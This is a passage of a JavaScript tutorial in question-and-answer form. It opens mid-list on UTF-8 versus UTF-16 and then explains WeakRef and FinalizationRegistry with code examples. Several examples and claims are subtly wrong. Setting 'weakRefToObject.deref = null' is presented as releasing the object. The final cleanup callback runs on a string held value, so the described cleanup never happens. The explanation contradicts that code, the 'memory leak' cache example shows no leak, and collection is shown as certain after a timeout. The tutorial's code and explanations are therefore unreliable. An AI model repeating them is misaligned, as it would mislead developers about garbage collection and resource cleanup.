4. **UTF-8 vs UTF-16**: For web use (e.g., URLs, HTTP headers, JSON), UTF-8 is typically preferred because of its backward compatibility with ASCII and better space efficiency. Internally, JavaScript (and most other modern languages) uses UTF-16 to represent strings, which can cause slight inefficiency when dealing with large numbers of characters outside the BMP.

### **Summary**:

- **UTF-8** is more efficient for encoding ASCII characters (1 byte) and is commonly used in web technologies, while **UTF-16** is used internally in JavaScript to represent strings.
- JavaScript handles multi-byte characters using UTF-16, and you need to be aware of **surrogate pairs** for characters outside the BMP, like emojis.
- For handling surrogate pairs or multi-byte characters, use methods like `codePointAt()` instead of `charCodeAt()` for accurate representation.

## **WeakRef and FinalizationRegistry**

### What is a **WeakRef** in JavaScript? How does it help in managing memory in situations involving garbage collection? Write an example where you create a **WeakRef** to an object.

### **WeakRef** in JavaScript

A **`WeakRef`** (Weak Reference) is a special type of reference to an object that does not prevent the object from being garbage collected. Unlike regular references in JavaScript, which prevent objects from being reclaimed by the garbage collector (GC), a `WeakRef` allows you to reference an object without preventing it from being garbage collected when there are no strong references left to it.

#### **How `WeakRef` Helps with Memory Management**

In traditional JavaScript, when you hold a reference to an object, it remains in memory until that reference is explicitly removed. This can cause **memory leaks** if you forget to release references to objects that are no longer needed.

**`WeakRef`** solves this problem by allowing the JavaScript engine to collect the referenced object if there are no other strong references to it. This is particularly useful in cases where you want to reference an object without preventing it from being garbage collected, such as in **caching mechanisms** or **memoization**.

### **Key Characteristics of `WeakRef`**:

1. **Does Not Prevent Garbage Collection**: A `WeakRef` does not prevent an object from being garbage collected. If an object is only referenced by weak references, the garbage collector can reclaim it when memory is needed.
2. **Cannot Be Enumerated**: You cannot access weak references in any way (e.g., through a for loop or by using `Object.keys()`).
3. **Only Works with Objects**: You can only create weak references to objects, not primitive values.

### **Syntax**:

```javascript
let weakRef = new WeakRef(object);
```

- **`object`**: The object to which you want to create a weak reference.

### **Usage Example**:

In this example, we'll create a `WeakRef` to an object and try to access it after it is garbage collected.

```javascript
// Create an object
let myObject = { name: "John", age: 30 };

// Create a weak reference to the object
let weakRef = new WeakRef(myObject);

// Function to retrieve the object from the weak reference
function getObjectFromWeakRef(ref) {
  let object = ref.deref(); // deref() retrieves the object or returns `undefined` if it's garbage collected
  if (object) {
    console.log("Object is still alive:", object);
  } else {
    console.log("Object has been garbage collected.");
  }
}

// Initially, we can retrieve the object
getObjectFromWeakRef(weakRef); // Output: Object is still alive: { name: 'John', age: 30 }

// Remove the strong reference to the object
myObject = null;

// After some time (possibly after garbage collection), try to access the object again
setTimeout(() => {
  getObjectFromWeakRef(weakRef); // Output: Object has been garbage collected.
}, 1000);
```

### **Explanation**:

1. We first create an object `myObject` and a `WeakRef` to it, called `weakRef`.
2. We define the function `getObjectFromWeakRef()`, which attempts to access the object via the `deref()` method of the `WeakRef`. If the object is still alive, it prints the object; otherwise, it indicates that the object has been garbage collected.
3. We nullify the strong reference to `myObject`, which allows the garbage collector to collect it (since there's no strong reference to it anymore).
4. After a short delay, we call `getObjectFromWeakRef()`, which shows that the object has been garbage collected.

### **Important Notes**:

- **`deref()` method**: This method is used to access the object stored in the `WeakRef`. It returns the object if it's still alive, or `undefined` if the object has been garbage collected.
- **Memory management**: The use of `WeakRef` is most useful in memory-sensitive situations, such as caching, where you want to avoid keeping objects in memory unnecessarily but still need to reference them temporarily.

### **Common Use Cases for `WeakRef`**:

1. **Caching**: In a caching mechanism, you may want to cache data but not hold onto it if it is no longer needed (i.e., if there are no other strong references).
2. **Memoization**: For functions that perform expensive computations, you might cache the results. However, when the object that was used for the calculation is no longer in use, it should be allowed to be garbage collected to avoid unnecessary memory usage.
3. **UI Frameworks**: In user interfaces, objects like DOM nodes or components may not always need to be held in memory, especially when no longer referenced by the UI, but you may still want a weak reference to them to handle asynchronous events.

### **Limitations of `WeakRef`**:

- **Accessing the object**: You cannot directly access the referenced object through a `WeakRef` unless you call `deref()`. It doesn't allow you to easily enumerate or interact with the objects as you would with regular references.
- **Lifecycle Management**: Since the referenced object can be garbage collected at any time, using `WeakRef` in some cases may require careful lifecycle management.

### **Conclusion**:

`WeakRef` provides a way to hold references to objects without preventing them from being garbage collected, which is useful in situations where you want to manage memory efficiently, such as caching or memoization. However, since objects referenced by a `WeakRef` can be collected at any time, you need to handle the case where the object might be `undefined` if it has been garbage collected.

### How does **WeakRef** differ from regular references in terms of garbage collection? Provide an example that demonstrates the use of **WeakRef** to avoid memory leaks.

### **WeakRef vs Regular References in Terms of Garbage Collection**

In JavaScript, **regular references** (also known as strong references) prevent objects from being garbage collected as long as the reference to the object exists. The garbage collector will only reclaim an object when there are **no more strong references** to it. On the other hand, a **`WeakRef`** does not prevent an object from being garbage collected. If the only reference to an object is a `WeakRef`, the garbage collector can reclaim the object when memory is needed, even if the `WeakRef` still exists.

### **Key Differences**:

1. **Regular References**:

   - If an object is referenced by a regular (strong) reference, the object is kept in memory until there are no more strong references to it.
   - Prevents garbage collection because the object is considered "reachable" as long as the reference exists.

2. **WeakRef**:
   - A `WeakRef` is a weak reference to an object, meaning it doesn't prevent the object from being garbage collected.
   - If an object is only referenced by a `WeakRef`, it can be garbage collected when the engine determines that it is no longer needed.

### **Use Case for `WeakRef` to Avoid Memory Leaks**:

`WeakRef` can help avoid memory leaks in situations where you want to cache or store objects temporarily without preventing them from being garbage collected when no longer needed. This is especially useful when dealing with large objects or when you want to keep memory usage low.

### **Example Demonstrating the Use of `WeakRef` to Avoid Memory Leaks**:

Imagine you have a caching mechanism for a heavy object. Without `WeakRef`, the cache could potentially hold onto objects for too long, causing memory leaks if they are no longer in use.

#### **Without `WeakRef` (Memory Leak Potential)**:

```javascript
function cacheData(data) {
  const cache = [];
  cache.push(data); // Adding data to the cache

  // Data will stay in memory because it's still strongly referenced in the cache
  console.log("Data cached:", cache);
}

const myLargeObject = { name: "Big Data", value: "Some large data..." };

// Calling cacheData will add a strong reference to myLargeObject in the cache array
cacheData(myLargeObject);

// At this point, myLargeObject is still in memory because it's referenced in the cache
// Even if no longer needed, it won't be garbage collected until the cache is cleared
```

#### **With `WeakRef` (No Memory Leak)**:

Now, let's modify the example to use `WeakRef` to avoid holding onto the data if it's no longer needed.

```javascript
function cacheDataWithWeakRef(data) {
  const weakCache = [];

  // Create a WeakRef to the data (it doesn't prevent garbage collection)
  weakCache.push(new WeakRef(data));

  // We can retrieve the object using deref() method, but it may be garbage collected
  console.log("Data cached with WeakRef:", weakCache);

  // Attempt to access data from the WeakRef
  setTimeout(() => {
    const ref = weakCache[0];
    const cachedData = ref.deref();

    if (cachedData) {
      console.log("Accessed cached data:", cachedData);
    } else {
      console.log("Data has been garbage collected.");
    }
  }, 1000);
}

const myLargeObject = { name: "Big Data", value: "Some large data..." };

// Calling cacheDataWithWeakRef will add a WeakRef to myLargeObject in the weakCache
cacheDataWithWeakRef(myLargeObject);

// After the function scope ends, there's no strong reference to myLargeObject
// If the garbage collector runs before accessing the WeakRef, the object may be cleaned up
```

### **Explanation**:

- **Without `WeakRef`**:

  - The `myLargeObject` is added to the `cache` array, which is a strong reference. This means that as long as the `cache` array exists, the `myLargeObject` will remain in memory, even if it's no longer needed.
  - This can lead to a **memory leak** if the cache is never cleared or if the object is large and not used again.

- **With `WeakRef`**:
  - The `WeakRef` is used to store a reference to `myLargeObject`. Since `WeakRef` does not prevent the object from being garbage collected, if there are no other strong references to `myLargeObject`, it can be garbage collected when the memory is needed.
  - The `deref()` method is used to check whether the object still exists. If the object has been garbage collected, `deref()` will return `undefined`.

### **Key Points**:

1. **Memory Efficiency**: By using `WeakRef`, you avoid retaining objects in memory unnecessarily. This is particularly helpful in caching systems or situations where objects are no longer needed but still referenced temporarily.
2. **Garbage Collection**: The garbage collector can reclaim objects that are only referenced by `WeakRef` as soon as no strong references remain.
3. **Non-Blocking References**: A `WeakRef` allows you to hold onto references without blocking garbage collection, preventing memory leaks in scenarios where caching or memoization is involved.

### **Conclusion**:

Using `WeakRef` helps to manage memory efficiently, especially in cases like caching, where you want to hold onto objects only as long as they are needed and allow the garbage collector to reclaim memory when those objects are no longer in use. This approach can help prevent memory leaks by ensuring that objects are not retained in memory indefinitely by weak references.

### What is a **FinalizationRegistry** in JavaScript? How can it be used in conjunction with **WeakRef** to perform cleanup tasks when an object is garbage-collected? Write an example.

### **FinalizationRegistry in JavaScript**

A **`FinalizationRegistry`** is a JavaScript object that allows you to register a callback function that will be triggered when an object is garbage collected. This can be useful for performing cleanup tasks, such as releasing resources, when objects are no longer reachable.

The `FinalizationRegistry` works in conjunction with **`WeakRef`** to allow objects to be tracked and cleaned up once they are garbage collected. When an object is no longer reachable (i.e., has no strong references), it will be garbage collected, and the `FinalizationRegistry` will trigger the callback function that was registered with it.

### **How FinalizationRegistry Works**:

1. You create a `FinalizationRegistry` instance and provide a callback function.
2. You register an object with the registry and associate it with a token (an identifier).
3. Once the object is garbage collected, the callback function is triggered, and you can perform any necessary cleanup.

### **Example Using FinalizationRegistry with WeakRef for Cleanup**:

In this example, we create an object, register it with a `WeakRef`, and associate it with a cleanup task. When the object is garbage collected, the cleanup task is triggered.

```javascript
// Create a FinalizationRegistry instance with a cleanup callback
const finalizationRegistry = new FinalizationRegistry((heldValue) => {
  console.log(`Cleanup task triggered for: ${heldValue}`);
});

// Create an object and register it with a WeakRef in the FinalizationRegistry
function createObject() {
  const obj = { name: "Heavy Object", data: "Some large data..." };

  // Register the object with the registry and associate it with a unique identifier
  finalizationRegistry.register(obj, obj.name);

  console.log("Object created:", obj);

  // Return the object wrapped in a WeakRef
  return new WeakRef(obj);
}

// Create an object and get a WeakRef to it
const weakRefToObject = createObject();

// After some time or operations, we can set the original reference to null to make the object unreachable
setTimeout(() => {
  console.log(
    "Dereferencing the object to make it eligible for garbage collection..."
  );
  // Dereference the object to make it eligible for garbage collection
  weakRefToObject.deref = null;
}, 1000);

// Optionally, trigger garbage collection manually in non-production environments for testing
setTimeout(() => {
  // At this point, if the garbage collector has run, the cleanup function will be triggered.
  // The object should be collected and the FinalizationRegistry's callback should be executed.
  console.log("Attempting cleanup...");
}, 2000);
```

### **Explanation of the Example**:

1. **Creating the `FinalizationRegistry`**:
   - The `FinalizationRegistry` is created with a cleanup callback function. The callback is triggered when the registered object is garbage collected.
2. **Registering the Object**:
   - The object (`obj`) is registered with the `FinalizationRegistry` along with a unique token (`obj.name`). This token is passed to the callback when the object is garbage collected.
3. **Using `WeakRef`**:
   - The object is wrapped in a `WeakRef`, which allows us to reference the object without preventing it from being garbage collected.
4. **Dereferencing the Object**:
   - After some time, we explicitly dereference the object by setting `weakRefToObject.deref = null` to ensure it is eligible for garbage collection.
5. **Cleanup Task**:
   - If the object is garbage collected, the callback registered in the `FinalizationRegistry` is triggered, and we log a cleanup message.

### **Important Notes**:

- **Garbage Collection**: The cleanup callback will be called **only when** the object is garbage collected. This happens when the object is no longer reachable (i.e., there are no strong references to it).
- **Timing**: The garbage collector's timing is not predictable, so the callback may be triggered at any point after the object becomes unreachable. In the example, we've added `setTimeout` to simulate the object's dereferencing and potential garbage collection.

- **WeakRef and FinalizationRegistry**: The combination of `WeakRef` and `FinalizationRegistry` allows for tracking and performing cleanup on objects that are not strongly referenced but still need some cleanup when they are garbage collected.

### **When to Use FinalizationRegistry**:

- **Resource Management**: For cleaning up expensive resources like file handles, network connections, or large memory buffers that need to be freed when an object is no longer in use.
- **Memory Efficiency**: To avoid keeping objects in memory just for the purpose of cleaning up, especially when managing large datasets or cached data.

### **Conclusion**:

`FinalizationRegistry` combined with `WeakRef` provides a powerful mechanism for performing cleanup tasks in JavaScript when an object is garbage collected. This is particularly useful in memory management scenarios where objects hold large resources that need to be cleaned up after they are no longer in use, preventing memory leaks.

### How can you use **WeakRef** and **FinalizationRegistry** to track and clean up resources (e.g., event listeners, connections) when an object is garbage collected?

To use **`WeakRef`** and **`FinalizationRegistry`** to track and clean up resources like **event listeners** or **connections** when an object is garbage collected, you can leverage the following approach:

1. **`WeakRef`**: Allows you to hold a reference to an object without preventing it from being garbage collected. This means that the object can be collected when there are no other strong references to it.
2. **`FinalizationRegistry`**: Lets you register a cleanup callback function that will be executed when an object is garbage collected. It works in tandem with `WeakRef` to manage the cleanup tasks, such as removing event listeners, closing connections, or releasing other resources when the object is no longer reachable.

### Example: Tracking and Cleaning Up Resources

Let's demonstrate a scenario where we have an object that holds an event listener and a network connection. When the object is garbage collected, we want to ensure that the event listener is removed and the connection is closed.

```javascript
// Create a FinalizationRegistry to handle cleanup tasks
const finalizationRegistry = new FinalizationRegistry((heldValue) => {
  console.log(`Cleanup triggered for: ${heldValue}`);
  if (heldValue && heldValue.cleanup) {
    heldValue.cleanup();
  }
});

// Function to simulate removing event listeners and closing connections
function cleanup() {
  console.log("Removing event listeners and closing connections...");
  // Simulate cleanup, such as removing event listeners and closing network connections
  // This can be specific to the resources held by the object
}

// Function to create an object that will have resources to clean up
function createResourceObject() {
  const resourceObject = {
    name: "ResourceObject1",
    eventListener: () => console.log("Event triggered!"),
    connection: "NetworkConnection1",
    cleanup, // Add a cleanup method to the object for removing resources
  };

  // Simulate adding an event listener (just for demonstration)
  console.log(`Adding event listener to ${resourceObject.name}...`);
  document.addEventListener("click", resourceObject.eventListener);

  // Register the resource object with the FinalizationRegistry
  finalizationRegistry.register(resourceObject, resourceObject.name);

  console.log("Resource object created:", resourceObject);

  return resourceObject;
}

// Create a resource object and store it in a WeakRef
let weakRefToObject = new WeakRef(createResourceObject());

// Dereference the object after some time to make it eligible for garbage collection
setTimeout(() => {
  console.log("Dereferencing the object to make it eligible for GC...");
  weakRefToObject.deref = null; // The object is now eligible for GC
}, 1000);

// Simulate garbage collection and cleanup after some more time
setTimeout(() => {
  console.log("Attempting cleanup...");
  // At this point, if the object has been garbage collected, the FinalizationRegistry's cleanup callback will be called
}, 2000);
```

### **Explanation of the Example**:

1. **`FinalizationRegistry`**:
   - A `FinalizationRegistry` is created, and a cleanup callback function is provided. This callback will be executed when the object is garbage collected.
2. **`createResourceObject`**:

   - This function creates an object (`resourceObject`) that represents a resource requiring cleanup (e.g., an event listener and a network connection).
   - The `cleanup` function, which removes event listeners and closes connections, is added as a method of the object.

3. **Registering the Object with `FinalizationRegistry`**:
   - The object is registered with the `FinalizationRegistry`, which associates it with a cleanup task (removing event listeners and closing connections). The object itself is passed as the token for tracking.
4. **Using `WeakRef`**:

   - A `WeakRef` is created for the object. This allows us to hold a reference to the object without preventing it from being garbage collected.
   - After a delay (`setTimeout`), the reference to the object is explicitly dereferenced by setting `weakRefToObject.deref = null`, making the object eligible for garbage collection.

5. **Automatic Cleanup**:
   - When the object is garbage collected, the `FinalizationRegistry` will automatically call the cleanup callback, logging the cleanup message and performing any necessary resource cleanup, such as removing event listeners or closing connections.

### **Important Points**:

- **Resource Cleanup**: The cleanup function (`cleanup`) is responsible for handling the actual cleanup of resources associated with the object. In this case, it simulates removing event listeners and closing a network connection.
- **Weak Reference**: By using `WeakRef`, we ensure that the object is not kept alive unnecessarily. When no other strong references to the object remain, it is eligible for garbage collection.

- **FinalizationRegistry**: The `FinalizationRegistry` is used to track the object and execute the cleanup code once the object is garbage collected. It provides a safe way to manage resources like event listeners, file handles, or database connections, which should be cleaned up when the object is no longer in use.

- **Timing**: The cleanup occurs after the object has been garbage collected, which happens asynchronously. This is why we use `setTimeout` to simulate the passage of time and allow the object to be garbage collected.

### **Use Cases**:

- **Event Listeners**: If an object has event listeners attached to it, it’s important to remove those listeners when the object is no longer needed to avoid memory leaks.
- **Network Connections**: For objects that manage network connections (e.g., WebSocket connections), these connections should be closed when the object is no longer used to avoid consuming resources.
- **Database Connections**: When managing connections to a database or file system, the connections should be closed to avoid resource exhaustion.

### **Conclusion**:

Using `WeakRef` and `FinalizationRegistry` together allows you to manage memory more efficiently by cleaning up resources when objects are garbage collected. This pattern is particularly useful for managing resources like event listeners and network connections, where it's crucial to release resources when they are no longer needed, avoiding memory leaks and ensuring that your application remains performant.
